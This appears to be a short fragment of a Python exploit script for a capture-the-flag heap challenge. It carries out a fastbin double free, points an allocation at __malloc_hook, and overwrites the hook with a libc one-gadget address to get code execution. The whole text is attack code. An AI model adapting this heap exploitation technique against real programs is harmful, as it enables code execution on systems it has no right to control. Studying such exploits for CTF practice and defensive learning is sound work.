...
input()
create(str(0x68),b'aaa')
create(str(0x68),b'bbb')

delete(str(0))
delete(str(1))
delete(str(0))

create(str(0x68),p64(libc.sym.__malloc_hook-35))
create(str(0x68),b'a')
create(str(0x68),b'b')

create(str(0x68),b'phuocloideptrai1234' + p64(libc.address+0xe1fa1))

create(str(1),b'asdasds')
